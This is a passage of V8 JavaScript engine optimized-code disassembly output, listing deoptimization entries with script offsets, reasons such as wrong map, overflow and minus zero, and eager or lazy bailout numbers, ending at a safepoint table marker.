0x172490877a96  deopt script offset  (1523)
0x172490877a96  deopt inlining id  (-1)
0x172490877a96  deopt reason  (wrong map)
0x172490877a96  deopt index
0x172490877a97  runtime entry  (eager deoptimization bailout 16)
0x172490877a9b  deopt script offset  (1523)
0x172490877a9b  deopt inlining id  (-1)
0x172490877a9b  deopt reason  (out of bounds)
0x172490877a9b  deopt index
0x172490877a9c  runtime entry  (eager deoptimization bailout 17)
0x172490877aa0  deopt script offset  (1610)
0x172490877aa0  deopt inlining id  (-1)
0x172490877aa0  deopt reason  (Smi)
0x172490877aa0  deopt index
0x172490877aa1  runtime entry  (eager deoptimization bailout 18)
0x172490877aa5  deopt script offset  (1610)
0x172490877aa5  deopt inlining id  (-1)
0x172490877aa5  deopt reason  (wrong map)
0x172490877aa5  deopt index
0x172490877aa6  runtime entry  (eager deoptimization bailout 19)
0x172490877aaa  deopt script offset  (1610)
0x172490877aaa  deopt inlining id  (-1)
0x172490877aaa  deopt reason  (out of bounds)
0x172490877aaa  deopt index
0x172490877aab  runtime entry  (eager deoptimization bailout 20)
0x172490877aaf  deopt script offset  (1820)
0x172490877aaf  deopt inlining id  (-1)
0x172490877aaf  deopt reason  (lost precision or NaN)
0x172490877aaf  deopt index
0x172490877ab0  runtime entry  (eager deoptimization bailout 21)
0x172490877ab4  deopt script offset  (1820)
0x172490877ab4  deopt inlining id  (-1)
0x172490877ab4  deopt reason  (overflow)
0x172490877ab4  deopt index
0x172490877ab5  runtime entry  (eager deoptimization bailout 22)
0x172490877ab9  deopt script offset  (1800)
0x172490877ab9  deopt inlining id  (-1)
0x172490877ab9  deopt reason  (wrong map)
0x172490877ab9  deopt index
0x172490877aba  runtime entry  (eager deoptimization bailout 23)
0x172490877abe  deopt script offset  (1800)
0x172490877abe  deopt inlining id  (-1)
0x172490877abe  deopt reason  (out of bounds)
0x172490877abe  deopt index
0x172490877abf  runtime entry  (eager deoptimization bailout 24)
0x172490877ac3  deopt script offset  (1800)
0x172490877ac3  deopt inlining id  (-1)
0x172490877ac3  deopt reason  (not a Smi)
0x172490877ac3  deopt index
0x172490877ac4  runtime entry  (eager deoptimization bailout 25)
0x172490877ac8  deopt script offset  (1936)
0x172490877ac8  deopt inlining id  (-1)
0x172490877ac8  deopt reason  (not a Smi)
0x172490877ac8  deopt index
0x172490877ac9  runtime entry  (eager deoptimization bailout 26)
0x172490877acd  deopt script offset  (1936)
0x172490877acd  deopt inlining id  (-1)
0x172490877acd  deopt reason  (overflow)
0x172490877acd  deopt index
0x172490877ace  runtime entry  (eager deoptimization bailout 27)
0x172490877ad2  deopt script offset  (2045)
0x172490877ad2  deopt inlining id  (-1)
0x172490877ad2  deopt reason  (wrong call target)
0x172490877ad2  deopt index
0x172490877ad3  runtime entry  (eager deoptimization bailout 28)
0x172490877ad7  deopt script offset  (904)
0x172490877ad7  deopt inlining id  (-1)
0x172490877ad7  deopt reason  (not a Smi)
0x172490877ad7  deopt index
0x172490877ad8  runtime entry  (eager deoptimization bailout 29)
0x172490877adc  deopt script offset  (982)
0x172490877adc  deopt inlining id  (-1)
0x172490877adc  deopt reason  (overflow)
0x172490877adc  deopt index
0x172490877add  runtime entry  (eager deoptimization bailout 30)
0x172490877ae1  deopt script offset  (1059)
0x172490877ae1  deopt inlining id  (-1)
0x172490877ae1  deopt reason  (not a heap number)
0x172490877ae1  deopt index
0x172490877ae2  runtime entry  (eager deoptimization bailout 31)
0x172490877ae6  deopt script offset  (1124)
0x172490877ae6  deopt inlining id  (-1)
0x172490877ae6  deopt reason  (not a Number or Oddball)
0x172490877ae6  deopt index
0x172490877ae7  runtime entry  (eager deoptimization bailout 32)
0x172490877aeb  deopt script offset  (1246)
0x172490877aeb  deopt inlining id  (-1)
0x172490877aeb  deopt reason  (not a Smi)
0x172490877aeb  deopt index
0x172490877aec  runtime entry  (eager deoptimization bailout 33)
0x172490877af0  deopt script offset  (1352)
0x172490877af0  deopt inlining id  (-1)
0x172490877af0  deopt reason  (not a Smi)
0x172490877af0  deopt index
0x172490877af1  runtime entry  (eager deoptimization bailout 34)
0x172490877af5  deopt script offset  (1352)
0x172490877af5  deopt inlining id  (-1)
0x172490877af5  deopt reason  (overflow)
0x172490877af5  deopt index
0x172490877af6  runtime entry  (eager deoptimization bailout 35)
0x172490877afa  deopt script offset  (1368)
0x172490877afa  deopt inlining id  (-1)
0x172490877afa  deopt reason  (not a Smi)
0x172490877afa  deopt index
0x172490877afb  runtime entry  (eager deoptimization bailout 36)
0x172490877aff  deopt script offset  (1368)
0x172490877aff  deopt inlining id  (-1)
0x172490877aff  deopt reason  (overflow)
0x172490877aff  deopt index
0x172490877b00  runtime entry  (eager deoptimization bailout 37)
0x172490877b04  deopt script offset  (1334)
0x172490877b04  deopt inlining id  (-1)
0x172490877b04  deopt reason  ((unknown))
0x172490877b04  deopt index
0x172490877b05  runtime entry  (lazy deoptimization bailout 38)
0x172490877b09  deopt script offset  (1526)
0x172490877b09  deopt inlining id  (-1)
0x172490877b09  deopt reason  (not a Smi)
0x172490877b09  deopt index
0x172490877b0a  runtime entry  (eager deoptimization bailout 39)
0x172490877b0e  deopt script offset  (1526)
0x172490877b0e  deopt inlining id  (-1)
0x172490877b0e  deopt reason  (overflow)
0x172490877b0e  deopt index
0x172490877b0f  runtime entry  (eager deoptimization bailout 40)
0x172490877b13  deopt script offset  (1523)
0x172490877b13  deopt inlining id  (-1)
0x172490877b13  deopt reason  (wrong map)
0x172490877b13  deopt index
0x172490877b14  runtime entry  (eager deoptimization bailout 41)
0x172490877b18  deopt script offset  (1523)
0x172490877b18  deopt inlining id  (-1)
0x172490877b18  deopt reason  (out of bounds)
0x172490877b18  deopt index
0x172490877b19  runtime entry  (eager deoptimization bailout 42)
0x172490877b1d  deopt script offset  (1610)
0x172490877b1d  deopt inlining id  (-1)
0x172490877b1d  deopt reason  (Smi)
0x172490877b1d  deopt index
0x172490877b1e  runtime entry  (eager deoptimization bailout 43)
0x172490877b22  deopt script offset  (1610)
0x172490877b22  deopt inlining id  (-1)
0x172490877b22  deopt reason  (wrong map)
0x172490877b22  deopt index
0x172490877b23  runtime entry  (eager deoptimization bailout 44)
0x172490877b27  deopt script offset  (1610)
0x172490877b27  deopt inlining id  (-1)
0x172490877b27  deopt reason  (out of bounds)
0x172490877b27  deopt index
0x172490877b28  runtime entry  (eager deoptimization bailout 45)
0x172490877b2c  deopt script offset  (1820)
0x172490877b2c  deopt inlining id  (-1)
0x172490877b2c  deopt reason  (lost precision or NaN)
0x172490877b2c  deopt index
0x172490877b2d  runtime entry  (eager deoptimization bailout 46)
0x172490877b31  deopt script offset  (1820)
0x172490877b31  deopt inlining id  (-1)
0x172490877b31  deopt reason  (overflow)
0x172490877b31  deopt index
0x172490877b32  runtime entry  (eager deoptimization bailout 47)
0x172490877b36  deopt script offset  (1800)
0x172490877b36  deopt inlining id  (-1)
0x172490877b36  deopt reason  (wrong map)
0x172490877b36  deopt index
0x172490877b37  runtime entry  (eager deoptimization bailout 48)
0x172490877b3b  deopt script offset  (1800)
0x172490877b3b  deopt inlining id  (-1)
0x172490877b3b  deopt reason  (out of bounds)
0x172490877b3b  deopt index
0x172490877b3c  runtime entry  (eager deoptimization bailout 49)
0x172490877b40  deopt script offset  (1800)
0x172490877b40  deopt inlining id  (-1)
0x172490877b40  deopt reason  (not a Smi)
0x172490877b40  deopt index
0x172490877b41  runtime entry  (eager deoptimization bailout 50)
0x172490877b45  deopt script offset  (1936)
0x172490877b45  deopt inlining id  (-1)
0x172490877b45  deopt reason  (not a Smi)
0x172490877b45  deopt index
0x172490877b46  runtime entry  (eager deoptimization bailout 51)
0x172490877b4a  deopt script offset  (1936)
0x172490877b4a  deopt inlining id  (-1)
0x172490877b4a  deopt reason  (overflow)
0x172490877b4a  deopt index
0x172490877b4b  runtime entry  (eager deoptimization bailout 52)
0x172490877b4f  deopt script offset  (2045)
0x172490877b4f  deopt inlining id  (-1)
0x172490877b4f  deopt reason  (wrong call target)
0x172490877b4f  deopt index
0x172490877b50  runtime entry  (eager deoptimization bailout 53)
0x172490877b54  deopt script offset  (771)
0x172490877b54  deopt inlining id  (-1)
0x172490877b54  deopt reason  (overflow)
0x172490877b54  deopt index
0x172490877b55  runtime entry  (eager deoptimization bailout 54)
0x172490877b59  deopt script offset  (730)
0x172490877b59  deopt inlining id  (-1)
0x172490877b59  deopt reason  ((unknown))
0x172490877b59  deopt index
0x172490877b5a  runtime entry  (lazy deoptimization bailout 55)
0x172490877b5e  deopt script offset  (864)
0x172490877b5e  deopt inlining id  (-1)
0x172490877b5e  deopt reason  (minus zero)
0x172490877b5e  deopt index
0x172490877b5f  runtime entry  (eager deoptimization bailout 56)
0x172490877b63  deopt script offset  (886)
0x172490877b63  deopt inlining id  (-1)
0x172490877b63  deopt reason  ((unknown))
0x172490877b63  deopt index
0x172490877b64  runtime entry  (lazy deoptimization bailout 57)
0x172490877b68  deopt script offset  (987)
0x172490877b68  deopt inlining id  (-1)
0x172490877b68  deopt reason  (division by zero)
0x172490877b68  deopt index
0x172490877b69  runtime entry  (eager deoptimization bailout 58)
0x172490877b6d  deopt script offset  (1368)
0x172490877b6d  deopt inlining id  (-1)
0x172490877b6d  deopt reason  (minus zero)
0x172490877b6d  deopt index
0x172490877b6e  runtime entry  (eager deoptimization bailout 59)
0x172490877b72  deopt script offset  (1820)
0x172490877b72  deopt inlining id  (-1)
0x172490877b72  deopt reason  (minus zero)
0x172490877b72  deopt index
0x172490877b73  runtime entry  (eager deoptimization bailout 60)
0x172490877b77  deopt script offset  (886)
0x172490877b77  deopt inlining id  (-1)
0x172490877b77  deopt reason  ((unknown))
0x172490877b77  deopt index
0x172490877b78  runtime entry  (lazy deoptimization bailout 61)
0x172490877b7c  deopt script offset  (987)
0x172490877b7c  deopt inlining id  (-1)
0x172490877b7c  deopt reason  (division by zero)
0x172490877b7c  deopt index
0x172490877b7d  runtime entry  (eager deoptimization bailout 62)
0x172490877b81  deopt script offset  (987)
0x172490877b81  deopt inlining id  (-1)
0x172490877b81  deopt reason  (minus zero)
0x172490877b81  deopt index
0x172490877b82  runtime entry  (eager deoptimization bailout 63)
0x172490877b86  deopt script offset  (1368)
0x172490877b86  deopt inlining id  (-1)
0x172490877b86  deopt reason  (minus zero)
0x172490877b86  deopt index
0x172490877b87  runtime entry  (eager deoptimization bailout 64)
0x172490877b8b  deopt script offset  (1820)
0x172490877b8b  deopt inlining id  (-1)
0x172490877b8b  deopt reason  (minus zero)
0x172490877b8b  deopt index
0x172490877b8c  runtime entry  (eager deoptimization bailout 65)
0x172490877b90  deopt script offset  (1918)
0x172490877b90  deopt inlining id  (-1)
0x172490877b90  deopt reason  ((unknown))
0x172490877b90  deopt index
0x172490877b91  runtime entry  (lazy deoptimization bailout 66)
0x172490877b95  deopt script offset  (1781)
0x172490877b95  deopt inlining id  (-1)
0x172490877b95  deopt reason  ((unknown))
0x172490877b95  deopt index
0x172490877b96  runtime entry  (lazy deoptimization bailout 67)
0x172490877b9a  deopt script offset  (1598)
0x172490877b9a  deopt inlining id  (-1)
0x172490877b9a  deopt reason  ((unknown))
0x172490877b9a  deopt index
0x172490877b9b  runtime entry  (lazy deoptimization bailout 68)
0x172490877b9f  deopt script offset  (1528)
0x172490877b9f  deopt inlining id  (-1)
0x172490877b9f  deopt reason  ((unknown))
0x172490877b9f  deopt index
0x172490877ba0  runtime entry  (lazy deoptimization bailout 69)
0x172490877ba4  deopt script offset  (1354)
0x172490877ba4  deopt inlining id  (-1)
0x172490877ba4  deopt reason  ((unknown))
0x172490877ba4  deopt index
0x172490877ba5  runtime entry  (lazy deoptimization bailout 70)
0x172490877ba9  deopt script offset  (1209)
0x172490877ba9  deopt inlining id  (-1)
0x172490877ba9  deopt reason  ((unknown))
0x172490877ba9  deopt index
0x172490877baa  runtime entry  (lazy deoptimization bailout 71)
0x172490877bae  deopt script offset  (1114)
0x172490877bae  deopt inlining id  (-1)
0x172490877bae  deopt reason  ((unknown))
0x172490877bae  deopt index
0x172490877baf  runtime entry  (lazy deoptimization bailout 72)
0x172490877bb3  deopt script offset  (1051)
0x172490877bb3  deopt inlining id  (-1)
0x172490877bb3  deopt reason  ((unknown))
0x172490877bb3  deopt index
0x172490877bb4  runtime entry  (lazy deoptimization bailout 73)
0x172490877bb8  deopt script offset  (906)
0x172490877bb8  deopt inlining id  (-1)
0x172490877bb8  deopt reason  ((unknown))
0x172490877bb8  deopt index
0x172490877bb9  runtime entry  (lazy deoptimization bailout 74)
0x172490877bbd  deopt script offset  (866)
0x172490877bbd  deopt inlining id  (-1)
0x172490877bbd  deopt reason  ((unknown))
0x172490877bbd  deopt index
0x172490877bbe  runtime entry  (lazy deoptimization bailout 75)
0x172490877bc2  deopt script offset  (836)
0x172490877bc2  deopt inlining id  (-1)
0x172490877bc2  deopt reason  ((unknown))
0x172490877bc2  deopt index
0x172490877bc3  runtime entry  (lazy deoptimization bailout 76)
0x172490877bc7  deopt script offset  (750)
0x172490877bc7  deopt inlining id  (-1)
0x172490877bc7  deopt reason  ((unknown))
0x172490877bc7  deopt index
0x172490877bc8  runtime entry  (lazy deoptimization bailout 77)
0x172490877bcc  comment  (;;; Safepoint table.)

--- End code ---
